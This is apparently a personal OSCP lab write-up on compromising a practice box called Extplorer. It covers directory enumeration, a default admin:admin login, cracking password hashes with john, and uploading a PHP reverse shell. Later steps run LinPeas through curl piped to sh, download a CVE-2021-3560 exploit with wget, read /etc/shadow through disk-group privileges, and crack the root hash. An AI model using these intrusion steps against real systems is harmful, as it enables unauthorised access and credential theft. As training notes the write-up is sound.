---
title: OSCP - Extplorer - Linux
created: 2026-01-26
updated: 2026-01-22
status: seed
draft: false
tags:
  - cyber-security
Related: "[[Cybersecurity]]"
---
# Extplorer
This was simultaneously the easiest and most frustrating box yet. Identifying and accessing `filemanager` was ridiculously easy, and uploading a reverse shell php and catching the shell *seemed* easy initially. Even finding credentials for `dora` was easy once I started looking through all the info that was available in the `filemanager` folder. 

What I wasn't expecting was to spend 2 hours trying to figure out why I couldn't upgrade the dumb shell I'd caught to a full shell, even though I ***knew*** the target was running `python3`. 

Turns out that;
1) **I didn't actually know what "Full TTY" really meant**. I went through endless walkthroughs explaining how to upgrade to "Full TTY" without realising that it meant a shell in an entirely new window. I just wanted a "full shell" eg. a minor upgrade from the dumb shell that would allow me to switch users and change directories. I didn't need something on the target that I could treat as an entirely separate tab and do things like "Ctrl+C" on without breaking the shell.
   
2) **MSFVenom doesn't produce good PHP reverse shells!!!** This was only discovered after spending ***WAY*** too much time looking for an explanation on why `python3 -c "import pty; pty.spawn('/bin/bash')"` (or any subtle variation of it) wasn't upgrading the dumb shell I'd caught. As soon as I found a comment in some buried StackOverflow thread about avoiding MSFVenom when creating PHP reverse shells, I created a new PHP file with the Ivan Sincek reverse shell from [revshells.com](https://www.revshells.com/), uploaded & executed it, then got a full shell the moment I tried to upgrade it. 

All that frustration aside, the Priv Esc phase was a lot more straightforward and *very* educational. Besides staring in rage at the step telling me to use `python3` to upgrade my shell, I'd barely touched the walkthrough for any guidance on how to progress with this box. But when `LinPeas` only offered 1) an exploit that couldn't be executed because of missing dependencies, and 2) highlighted "user is part of `disk` group"; I needed to reference the walkthrough to figure out how to use `disk` group privilege to read sensitive details and ID a way to escalate to `root` (eg. reading the `shadow` and cracking the hash on `root`). Using `df -h` and `debugfs` was really cool, so I'll absolutely keep an eye out for that escalation vector in future.
# Resolution summary
- Nmap scan to identify ports `22` & `80`
- Gobuster scan to identify `filemanager`
- Password guessed to access `filemanager` Admin panel
- Identified password hash for `dora` in config file
- Cracked `dora` hash with `john`
- Uploaded php reverse shell to `filemanager`
- Caught reverse shell by navigating to uploaded php file
- Switched to user `dora` with cracked password, printed `local.txt`
- Ran `Linpeas.sh` and identified `dora` user is member of `disk` group
- Used `df -h` to identify disk partition with OS
- Used `disk` group privileges to print `proof.txt`
- Used `disk` group privileges to print `/etc/shadow` 
- Retrieved password hash for `root` & cracked hash for password
- Switched to user `root` with cracked password, printed `proof.txt`
## Improved skills
- Creating reverse shells with revshells.com instead of `msfvenom`
- Upgrading from basic to full shell
- Using `john` to crack password hashes
- Using `disk` privileges to protected files 
## Used tools
- nmap
- gobuster
- MSFVenom
- revshells.com
- LinPeas.sh
- john
- df
- debugfs

---
# Information Gathering
Scanned all TCP ports:
```bash
sudo nmap -sC -sV -oN extplorer.nmap 192.168.137.16 -v
```

Enumerated open TCP ports:
```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 98:4e:5d:e1:e6:97:29:6f:d9:e0:d4:82:a8:f6:4f:3f (RSA)
|   256 57:23:57:1f:fd:77:06:be:25:66:61:14:6d:ae:5e:98 (ECDSA)
|_  256 c7:9b:aa:d5:a6:33:35:91:34:1e:ef:cf:61:a8:30:1c (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

---
# Enumeration
## Port 22 - SSH (OpenSSH 7.9p1)
No enumeration conducted
## Port 80 - HTTP (Apache)
- Navigated to `http://192.168.137.16:80` and redirected to `http://192.168.137.16/wp-admin-setup-config.php`
![OSCP Extplorer Linux Image1](/images/OSCP%20-%20Extplorer%20-%20Linux%20-%20image1.png)
- Clicked "Let's go!" and setup Admin config
![OSCP Extplorer Linux Image2](/images/OSCP%20-%20Extplorer%20-%20Linux%20-%20image2.png)
- Error message received
![OSCP Extplorer Linux Image3](/images/OSCP%20-%20Extplorer%20-%20Linux%20-%20image3.png)
- Enumerated web directories with `gobuster` 
![OSCP Extplorer Linux Image4](/images/OSCP%20-%20Extplorer%20-%20Linux%20-%20image4.png)
- Identified `filemanager` directory & navigated to `http:192.168.137.16/filemanager`
![OSCP Extplorer Linux Image5](/images/OSCP%20-%20Extplorer%20-%20Linux%20-%20image5.png)
- Password guessed `admin:admin` credentials and logged into Admin panel
![OSCP Extplorer Linux Image6](/images/OSCP%20-%20Extplorer%20-%20Linux%20-%20image6.png)
- Clicked "OK" and identified `dora` user from new pop-up
![OSCP Extplorer Linux Image7](/images/OSCP%20-%20Extplorer%20-%20Linux%20-%20image7.png)
- Checked `filemanager/config/.htusers.php` and found `dora` password hash `$2a$08$zyiNvVoP/UuSMgO2rKDtLuox.vYj.3hZPVYq3i4oG3/CtgET7CjjS`
![OSCP Extplorer Linux Image8](/images/OSCP%20-%20Extplorer%20-%20Linux%20-%20image8.png)
- Ran `john` against password hash for `dora` and found credential `dora:doraemon`
![OSCP Extplorer Linux Image9](/images/OSCP%20-%20Extplorer%20-%20Linux%20-%20image9.png)
---
# Exploitation
## Name of the technique
- Identified option to upload files to Admin dashboard
![OSCP Extplorer Linux Image10](/images/OSCP%20-%20Extplorer%20-%20Linux%20-%20image10.png)
- Created PHP reverse shell file with `revshells.com` and saved file as `shell2.php`
![OSCP Extplorer Linux Image11](/images/OSCP%20-%20Extplorer%20-%20Linux%20-%20image11.png)
- Uploaded `shell2.php`, attempted to navigate to `192.168.137.16/filemanager/shell2.php` and caught reverse shell
![OSCP Extplorer Linux Image12](/images/OSCP%20-%20Extplorer%20-%20Linux%20-%20image12.png)
---
# Lateral Movement to user
## Local Enumeration
- Upgraded to full shell, switched user with credentials `dora:doraemon`, then upgraded to full shell again
![OSCP Extplorer Linux Image13](/images/OSCP%20-%20Extplorer%20-%20Linux%20-%20image13.png)
- Navigated to `/home/dora` and printed file `local.txt`
![OSCP Extplorer Linux Image14](/images/OSCP%20-%20Extplorer%20-%20Linux%20-%20image14.png)
- Ran `cat /etc/passwd` to identify any other users & `cat /etc/shadow` to check access
![OSCP Extplorer Linux Image15](/images/OSCP%20-%20Extplorer%20-%20Linux%20-%20image15.png)
---
# Privilege Escalation
## Local Enumeration
- Ran `sudo -l` to check sudo privileges for `dora`
![OSCP Extplorer Linux Image16](/images/OSCP%20-%20Extplorer%20-%20Linux%20-%20image16.png)
- Ran `curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh` to download and execute `LinPeas`
![OSCP Extplorer Linux Image17](/images/OSCP%20-%20Extplorer%20-%20Linux%20-%20image17.png)
- Identified by `LinPeas` as vulnerable to [CVE-2021-3560](https://github.com/UNICORDev/exploit-CVE-2021-3560)
![OSCP Extplorer Linux Image18](/images/OSCP%20-%20Extplorer%20-%20Linux%20-%20image18.png)
	- CVE-2021-3560 can be used to bypass polkitd credentials checks to elevate a user to `root`
- Identified user `dora` is part of `disk` group
![OSCP Extplorer Linux Image19](/images/OSCP%20-%20Extplorer%20-%20Linux%20-%20image19.png)
	- Also ran `- find /dev -group disk` to check partitions owned by `disk`
		![OSCP Extplorer Linux Image20](/images/OSCP%20-%20Extplorer%20-%20Linux%20-%20image20.png)
- Identified ssh config file
![OSCP Extplorer Linux Image21](/images/OSCP%20-%20Extplorer%20-%20Linux%20-%20image21.png)
- Identified interesting files modified in last 5 mins
![OSCP Extplorer Linux Image22](/images/OSCP%20-%20Extplorer%20-%20Linux%20-%20image22.png)
## Privilege Escalation vector
- Ran `wget https://raw.githubusercontent.com/UNICORDev/exploit-CVE-2021-3560/refs/heads/main/exploit-CVE-2021-3560.py` to copy exploit onto target
![OSCP Extplorer Linux Image23](/images/OSCP%20-%20Extplorer%20-%20Linux%20-%20image23.png)
- Ran `python3 exploit-CVE-2021-3560.py -u offsec -p pass` to attempt exploit creating user with credentials `offsec:pass`, then failed to install exploit dependency `gnome-control-center`
![OSCP Extplorer Linux Image24](/images/OSCP%20-%20Extplorer%20-%20Linux%20-%20image24.png)
- Ignored further investigation of `CVE-2021-3560`, and attempted escalation through `dora` user being member of `disk` group.
- Ran `df -h` to identify available partitions, and identified `/dev/mapper/ubuntu--vg-ubuntu--lv` as likely partition for Ubuntu OS
![OSCP Extplorer Linux Image25](/images/OSCP%20-%20Extplorer%20-%20Linux%20-%20image25.png)
- Navigated to `/root` and printed `/root/proof.txt`
![OSCP Extplorer Linux Image26](/images/OSCP%20-%20Extplorer%20-%20Linux%20-%20image26.png)
- Ran `cat /etc/shadow` to print password hashes
![OSCP Extplorer Linux Image27](/images/OSCP%20-%20Extplorer%20-%20Linux%20-%20image27.png)
- Copied `root:$6$AIWcIr8PEVxEWgv1$3mFpTQAc9Kzp4BGUQ2sPYYFE/dygqhDiv2Yw.XcU.Q8n1YO05.a/4.D/x4ojQAkPnv/v7Qrw7Ici7.hs0sZiC.:19453:0:99999:7:::` into file and cracked hash with `john` for password `explorer`
![OSCP Extplorer Linux Image28](/images/OSCP%20-%20Extplorer%20-%20Linux%20-%20image28.png)
- Ran `su root` to switch to `root` user with password `explorer`, and ran `ifconfig` to confirm IP address
![OSCP Extplorer Linux Image29](/images/OSCP%20-%20Extplorer%20-%20Linux%20-%20image29.png)
---
# Trophy & Loot
`local.txt` = `3e1616c5b86c3e113681958a619f6794`
`root.txt` = `61b257ef0bcf2110b8c0622b32238ae9`

